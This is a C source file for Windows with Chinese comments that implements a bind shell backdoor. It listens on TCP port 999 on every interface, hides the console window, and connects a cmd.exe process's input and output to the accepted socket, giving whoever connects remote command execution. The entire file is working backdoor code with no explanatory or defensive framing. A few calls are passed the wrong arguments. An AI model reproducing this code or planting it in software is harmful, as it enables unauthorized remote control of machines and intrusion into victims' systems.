#pragma comment (lib,"ws2_32.lib")
#include <winsock2.h>

int main(int argc ,char **argv)
{
	WSADATA WSADA;
	sockaddr_in ServerAddr;
	SOCKET Csocket,SSocket;//服务端和客户端套接字
	int Addrsize;
	PROCESS_INFORMATION ProcessInfo;
	STARTUPINFO StartupInfo;
	char szCmdPath[255];

	//分配内存 初始化数据
	ZeroMemory(&ProcessInfo,sizeof(PROCESS_INFORMATION));
	ZeroMemory(&StartupInfo,sizeof(STARTUPINFO));
	ZeroMemory(&WSADA,sizeof(WSADATA));

	//获取cmd shell路径

	GetEnvironmentVariable("COMSPEC",szCmdPath,sizeof(szCmdPath));
	

	//加载ws2_32.dll
	WSAStartup(0x0202,&WSADA);
	//设置本地信息和绑定服务器端套接字 

	ServerAddr.sin_family=AF_INET;
	ServerAddr.sin_addr.S_un.S_addr=INADDR_ANY;//绑定所有地址
	ServerAddr.sin_port=htons(999);
	SSocket=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);
	//绑定端口
	bind(SSocket,(sockaddr*)&ServerAddr,sizeof(ServerAddr));
	
	//监听
	listen(SSocket,1);
	Addrsize=sizeof(ServerAddr);
	
	//创建远程连接shell
	Csocket=accept(SSocket,(sockaddr*)&Csocket,&Addrsize);
	StartupInfo.cb=sizeof(STARTUPINFO);
	StartupInfo.wShowWindow=SW_HIDE;
	StartupInfo.dwFlags=STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
	StartupInfo.hStdInput=(HANDLE)Csocket;
	StartupInfo.hStdOutput=(HANDLE)Csocket;
	StartupInfo.hStdError=(HANDLE)Csocket;

	//创建匿名管道
	CreateProcess(NULL,szCmdPath,NULL,NULL,TRUE,0,NULL,NULL,&StartupInfo,&ProcessInfo);

	//等待shell退出
	WaitForSingleObject((HANDLE)ProcessInfo.dwProcessId,INFINITE);
	CloseHandle(ProcessInfo.hProcess);
	CloseHandle(ProcessInfo.hThread);

	closesocket(Csocket);
	closesocket(SSocket);
	WSACleanup();
	//关闭卸载ws2_32.dll
	return 0;
}